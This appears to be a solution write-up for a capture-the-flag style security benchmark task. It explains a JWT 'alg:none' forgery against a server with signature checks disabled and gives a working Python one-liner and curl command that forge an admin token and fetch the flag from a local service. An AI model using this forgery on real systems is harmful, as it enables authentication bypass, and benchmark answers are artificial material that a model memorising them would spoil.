# XBEN-091-24 — JWT Tamper

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** JWT `alg:none` forgery. The server issues JWTs with `jwt.encode(..., '',
algorithm='none')` and, critically, both `/profile` and `/gettheflag` decode the token cookie with
`jwt.decode(token, options={"verify_signature": False})` — signature verification is entirely
disabled. An attacker can therefore construct an arbitrary unsigned `alg: none` JWT with
`role: admin` and the server will trust it without ever checking a MAC/signature.

## Exploit

```bash
# Forge an alg:none JWT with role=admin (no signature needed/possible)
python3 -c "
import base64, json
def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')
header = b64u(json.dumps({'alg':'none','typ':'JWT'}, separators=(',',':')).encode())
payload = b64u(json.dumps({'username':'admin','role':'admin'}, separators=(',',':')).encode())
print(header.decode() + '.' + payload.decode() + '.')
"
# -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.

TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
curl -s --cookie "token=$TOKEN" http://localhost:55432/gettheflag
```
